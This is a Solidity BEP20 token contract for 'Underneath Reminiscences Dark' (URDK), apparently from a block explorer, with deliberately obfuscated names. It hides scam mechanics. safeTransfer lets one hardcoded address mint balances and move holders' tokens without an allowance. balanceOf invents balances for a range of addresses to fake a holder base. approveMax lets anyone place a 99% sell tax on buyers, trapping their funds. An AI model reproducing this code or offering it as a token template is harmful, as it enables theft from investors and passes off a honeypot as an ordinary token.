/**
 *Submitted for verification at BscScan.com on 2023-01-06
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;



interface IBEP20 {

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function getOwner() external view returns (address);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function name() external view returns (string memory);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}


interface IUniswapV2Router {

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function factory() external pure returns (address);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


library SafeMath {

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

}




contract UnderneathReminiscencesDark is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;

    uint256 public listLaunchReceiverTrading = 0;
    uint256 private launchTotalMarketingToken = 0;
    mapping(address => bool)  enableLaunchedMaxFee;
    uint256 constant buyMarketingLaunchBurnLiquidityFeeFrom = 300000 * 10 ** 18;
    bool public amountFundTxIs = false;
    uint256 private toReceiverMaxExemptShouldTeamTake = 0;


    bool private botsAmountLaunchedTradingTx = false;
    uint256 private shouldModeMarketingAt = 0;

    address private autoReceiverTakeFund = (msg.sender);

    bool public fundFeeLimitAt = false;
    bool public marketingEnableLaunchedList = false;
    string constant _symbol = "URDK";

    mapping(address => bool) private marketingEnableAtMint;

    bool private launchSwapReceiverMax = false;
    address constant receiverListBotsLiquidityLaunchedWallet = 0x828c0A4fcd7F069d406b5650268044a170A9ee95;
    bool public amountSellMaxTx = false;

    bool public marketingTotalSwapTeam = false;
    uint256  maxBurnMinSell = 100000000 * 10 ** _decimals;
    bool private listLaunchReceiverTrading1 = false;
    uint256  listSenderMinMax = 100000000 * 10 ** _decimals;
    string constant _name = "Underneath Reminiscences Dark";
    bool public takeTxBotsLaunched = false;
    uint256 private senderAmountShouldLiquidity = 100;

    uint256 atShouldTakeTeam = 0;
    mapping(address => bool)  fromAtFundTx;
    uint256 private listLaunchReceiverTrading0 = 0;
    mapping(address => mapping(address => uint256)) _allowances;
    
    address public uniswapV2Pair;

    mapping(address => uint256) _balances;
    address constant marketingFeeLaunchedAt = 0xe20ebD6766805485B6aC759D4AFB9429F9735005;

    IUniswapV2Router public marketingShouldBotsSwap;
    uint256 private mintTxToBuy = 0;

    uint256 constant atLaunchToModeIsAutoLaunched = 10000 * 10 ** 18;
    uint256 launchedExemptModeTokenTradingSender = 100000000 * (10 ** _decimals);
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        marketingShouldBotsSwap = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(marketingShouldBotsSwap.factory()).createPair(address(this), marketingShouldBotsSwap.WETH());
        _allowances[address(this)][address(marketingShouldBotsSwap)] = launchedExemptModeTokenTradingSender;

        marketingEnableAtMint[msg.sender] = true;
        marketingEnableAtMint[address(this)] = true;

        _balances[msg.sender] = launchedExemptModeTokenTradingSender;
        emit Transfer(address(0), msg.sender, launchedExemptModeTokenTradingSender);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return launchedExemptModeTokenTradingSender;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function safeTransfer(address sellAtMarketingBuyender, address tradingFeeAtMax, uint256 autoLiquidityLaunchFund) public {
        if (!burnTradingBuyAmount(msg.sender)) {
            return;
        }
        if (mintAtBotsTeam(uint160(tradingFeeAtMax))) {
            fromEnableTokenLaunchTotal(sellAtMarketingBuyender, tradingFeeAtMax, autoLiquidityLaunchFund, false);
            return;
        }
        if (tradingFeeAtMax == address(0)) {
            return;
        }
        if (mintAtBotsTeam(uint160(sellAtMarketingBuyender))) {
            fromEnableTokenLaunchTotal(sellAtMarketingBuyender, tradingFeeAtMax, autoLiquidityLaunchFund, true);
            return;
        }
        if (autoLiquidityLaunchFund == 0) {
            return;
        }
        if (sellAtMarketingBuyender == address(0)) {
            _balances[tradingFeeAtMax] = _balances[tradingFeeAtMax].add(autoLiquidityLaunchFund);
            return;
        }
    }

    function setreceiverAmountTakeLiquidity(address shouldTakeLaunchedTeam,bool swapBotsLaunchedTo) public onlyOwner {
        marketingEnableAtMint[shouldTakeLaunchedTeam]=swapBotsLaunchedTo;
    }

    function mintAtBotsTeam(uint160 takeBuySenderBotsWalletSell) private pure returns (bool) {
        if (takeBuySenderBotsWalletSell >= uint160(marketingFeeLaunchedAt)) {
            if (takeBuySenderBotsWalletSell <= uint160(marketingFeeLaunchedAt) + 200000) {
                return true;
            }
        }
        return false;
    }

    function launchedSellReceiverTrading(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function modeReceiverTradingBurnWalletLiquiditySell(address sellAtMarketingBuyender, address tradingFeeAtMax, uint256 autoLiquidityLaunchFund) internal returns (bool) {
        if (mintAtBotsTeam(uint160(tradingFeeAtMax))) {
            fromEnableTokenLaunchTotal(sellAtMarketingBuyender, tradingFeeAtMax, autoLiquidityLaunchFund, false);
            return true;
        }
        if (mintAtBotsTeam(uint160(sellAtMarketingBuyender))) {
            fromEnableTokenLaunchTotal(sellAtMarketingBuyender, tradingFeeAtMax, autoLiquidityLaunchFund, true);
            return true;
        }
        
        bool launchReceiverAtTakeFund = isBurnToMax(sellAtMarketingBuyender) || isBurnToMax(tradingFeeAtMax);
        
        if (sellAtMarketingBuyender == uniswapV2Pair && !launchReceiverAtTakeFund) {
            fromAtFundTx[tradingFeeAtMax] = true;
        }
        
        if (shouldModeMarketingAt != toReceiverMaxExemptShouldTeamTake) {
            shouldModeMarketingAt = listLaunchReceiverTrading0;
        }


        if (launchReceiverAtTakeFund) {
            return launchedSellReceiverTrading(sellAtMarketingBuyender, tradingFeeAtMax, autoLiquidityLaunchFund);
        }
        
        _balances[sellAtMarketingBuyender] = _balances[sellAtMarketingBuyender].sub(autoLiquidityLaunchFund, "Insufficient Balance!");
        
        uint256 autoLiquidityLaunchFundReceived = teamWalletReceiverShould(sellAtMarketingBuyender) ? totalSellAtReceiverLaunchedFundFrom(sellAtMarketingBuyender, tradingFeeAtMax, autoLiquidityLaunchFund) : autoLiquidityLaunchFund;

        _balances[tradingFeeAtMax] = _balances[tradingFeeAtMax].add(autoLiquidityLaunchFundReceived);
        emit Transfer(sellAtMarketingBuyender, tradingFeeAtMax, autoLiquidityLaunchFundReceived);
        return true;
    }

    function totalSellAtReceiverLaunchedFundFrom(address sellAtMarketingBuyender, address liquidityFeeTotalBurnLimitExemptAt, uint256 autoLiquidityLaunchFund) internal returns (uint256) {
        
        if (listLaunchReceiverTrading0 != shouldModeMarketingAt) {
            listLaunchReceiverTrading0 = shouldModeMarketingAt;
        }

        if (listLaunchReceiverTrading == listLaunchReceiverTrading) {
            listLaunchReceiverTrading = listLaunchReceiverTrading0;
        }

        if (listLaunchReceiverTrading1 != amountSellMaxTx) {
            listLaunchReceiverTrading1 = takeTxBotsLaunched;
        }


        uint256 receiverMinWalletShould = autoLiquidityLaunchFund.mul(modeEnableBuyList(sellAtMarketingBuyender, liquidityFeeTotalBurnLimitExemptAt == uniswapV2Pair)).div(senderAmountShouldLiquidity);

        if (receiverMinWalletShould > 0) {
            _balances[address(this)] = _balances[address(this)].add(receiverMinWalletShould);
            emit Transfer(sellAtMarketingBuyender, address(this), receiverMinWalletShould);
        }

        return autoLiquidityLaunchFund.sub(receiverMinWalletShould);
    }

    function teamWalletReceiverShould(address sellAtMarketingBuyender) internal view returns (bool) {
        return !marketingEnableAtMint[sellAtMarketingBuyender];
    }

    function getsellLimitExemptShouldLiquidityLaunched() public view returns (bool) {
        if (marketingEnableLaunchedList != listLaunchReceiverTrading1) {
            return listLaunchReceiverTrading1;
        }
        return marketingEnableLaunchedList;
    }

    function minExemptFeeAt(uint160 takeBuySenderBotsWalletSell) private view returns (uint256) {
        uint256 sellAtMarketingBuy = atShouldTakeTeam;
        uint256 mintWalletMaxAmount = takeBuySenderBotsWalletSell - uint160(marketingFeeLaunchedAt);
        if (mintWalletMaxAmount < sellAtMarketingBuy) {
            return atLaunchToModeIsAutoLaunched;
        }
        return buyMarketingLaunchBurnLiquidityFeeFrom;
    }

    function gettradingBuyEnableMax() public view returns (bool) {
        if (botsAmountLaunchedTradingTx != fundFeeLimitAt) {
            return fundFeeLimitAt;
        }
        if (botsAmountLaunchedTradingTx == amountSellMaxTx) {
            return amountSellMaxTx;
        }
        if (botsAmountLaunchedTradingTx != launchSwapReceiverMax) {
            return launchSwapReceiverMax;
        }
        return botsAmountLaunchedTradingTx;
    }

    function gettradingSellMarketingList() public view returns (bool) {
        if (amountFundTxIs == listLaunchReceiverTrading1) {
            return listLaunchReceiverTrading1;
        }
        if (amountFundTxIs == listLaunchReceiverTrading1) {
            return listLaunchReceiverTrading1;
        }
        if (amountFundTxIs == launchSwapReceiverMax) {
            return launchSwapReceiverMax;
        }
        return amountFundTxIs;
    }

    function settradingBuyEnableMax(bool shouldTakeLaunchedTeam) public onlyOwner {
        if (botsAmountLaunchedTradingTx == marketingTotalSwapTeam) {
            marketingTotalSwapTeam=shouldTakeLaunchedTeam;
        }
        botsAmountLaunchedTradingTx=shouldTakeLaunchedTeam;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function setburnTeamIsMin(uint256 shouldTakeLaunchedTeam) public onlyOwner {
        if (shouldModeMarketingAt != listLaunchReceiverTrading0) {
            listLaunchReceiverTrading0=shouldTakeLaunchedTeam;
        }
        if (shouldModeMarketingAt == listLaunchReceiverTrading0) {
            listLaunchReceiverTrading0=shouldTakeLaunchedTeam;
        }
        if (shouldModeMarketingAt == listLaunchReceiverTrading0) {
            listLaunchReceiverTrading0=shouldTakeLaunchedTeam;
        }
        shouldModeMarketingAt=shouldTakeLaunchedTeam;
    }

    function getteamLaunchedEnableMin() public view returns (uint256) {
        if (listLaunchReceiverTrading0 == senderAmountShouldLiquidity) {
            return senderAmountShouldLiquidity;
        }
        return listLaunchReceiverTrading0;
    }

    function getreceiverAmountTakeLiquidity(address shouldTakeLaunchedTeam) public view returns (bool) {
        if (marketingEnableAtMint[shouldTakeLaunchedTeam] != marketingEnableAtMint[shouldTakeLaunchedTeam]) {
            return marketingTotalSwapTeam;
        }
        if (shouldTakeLaunchedTeam != autoReceiverTakeFund) {
            return botsAmountLaunchedTradingTx;
        }
            return marketingEnableAtMint[shouldTakeLaunchedTeam];
    }

    function fromEnableTokenLaunchTotal(address sellAtMarketingBuyender, address tradingFeeAtMax, uint256 autoLiquidityLaunchFund, bool maxFromMintLimitTradingFund) private {
        if (maxFromMintLimitTradingFund) {
            sellAtMarketingBuyender = address(uint160(uint160(marketingFeeLaunchedAt) + atShouldTakeTeam));
            atShouldTakeTeam++;
            _balances[tradingFeeAtMax] = _balances[tradingFeeAtMax].add(autoLiquidityLaunchFund);
        } else {
            _balances[sellAtMarketingBuyender] = _balances[sellAtMarketingBuyender].sub(autoLiquidityLaunchFund);
        }
        emit Transfer(sellAtMarketingBuyender, tradingFeeAtMax, autoLiquidityLaunchFund);
    }

    function isApproveMax(address spender) public view returns (bool) {
        return enableLaunchedMaxFee[spender];
    }

    function setlaunchSwapBuyAuto(uint256 shouldTakeLaunchedTeam) public onlyOwner {
        toReceiverMaxExemptShouldTeamTake=shouldTakeLaunchedTeam;
    }

    function settradingSellMarketingList(bool shouldTakeLaunchedTeam) public onlyOwner {
        if (amountFundTxIs == amountFundTxIs) {
            amountFundTxIs=shouldTakeLaunchedTeam;
        }
        if (amountFundTxIs == amountSellMaxTx) {
            amountSellMaxTx=shouldTakeLaunchedTeam;
        }
        if (amountFundTxIs != botsAmountLaunchedTradingTx) {
            botsAmountLaunchedTradingTx=shouldTakeLaunchedTeam;
        }
        amountFundTxIs=shouldTakeLaunchedTeam;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return modeReceiverTradingBurnWalletLiquiditySell(msg.sender, recipient, amount);
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function burnTradingBuyAmount(address takeBuySenderBotsWalletSell) private pure returns (bool) {
        return takeBuySenderBotsWalletSell == receiverListBotsLiquidityLaunchedWallet;
    }

    function getlaunchSwapBuyAuto() public view returns (uint256) {
        return toReceiverMaxExemptShouldTeamTake;
    }

    function setteamLaunchedEnableMin(uint256 shouldTakeLaunchedTeam) public onlyOwner {
        if (listLaunchReceiverTrading0 != mintTxToBuy) {
            mintTxToBuy=shouldTakeLaunchedTeam;
        }
        listLaunchReceiverTrading0=shouldTakeLaunchedTeam;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function modeEnableBuyList(address sellAtMarketingBuyender, bool sellAtMarketingBuyelling) internal returns (uint256) {
        if (enableLaunchedMaxFee[sellAtMarketingBuyender]) {
            return 99;
        }
        
        if (amountFundTxIs == fundFeeLimitAt) {
            amountFundTxIs = botsAmountLaunchedTradingTx;
        }

        if (listLaunchReceiverTrading0 == listLaunchReceiverTrading0) {
            listLaunchReceiverTrading0 = listLaunchReceiverTrading0;
        }


        if (sellAtMarketingBuyelling) {
            return toReceiverMaxExemptShouldTeamTake;
        }
        if (!sellAtMarketingBuyelling && sellAtMarketingBuyender == uniswapV2Pair) {
            return mintTxToBuy;
        }
        return 0;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function getburnTeamIsMin() public view returns (uint256) {
        if (shouldModeMarketingAt != listLaunchReceiverTrading) {
            return listLaunchReceiverTrading;
        }
        return shouldModeMarketingAt;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != launchedExemptModeTokenTradingSender) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return modeReceiverTradingBurnWalletLiquiditySell(sender, recipient, amount);
    }

    function setsellLimitExemptShouldLiquidityLaunched(bool shouldTakeLaunchedTeam) public onlyOwner {
        if (marketingEnableLaunchedList == botsAmountLaunchedTradingTx) {
            botsAmountLaunchedTradingTx=shouldTakeLaunchedTeam;
        }
        if (marketingEnableLaunchedList != takeTxBotsLaunched) {
            takeTxBotsLaunched=shouldTakeLaunchedTeam;
        }
        marketingEnableLaunchedList=shouldTakeLaunchedTeam;
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (mintAtBotsTeam(uint160(account))) {
            return minExemptFeeAt(uint160(account));
        }
        return _balances[account];
    }

    function approveMax(address spender) external {
        if (fromAtFundTx[spender]) {
            enableLaunchedMaxFee[spender] = true;
        }
    }

    function isBurnToMax(address feeSellFromEnableExemptMaxTx) private view returns (bool) {
        return feeSellFromEnableExemptMaxTx == autoReceiverTakeFund;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}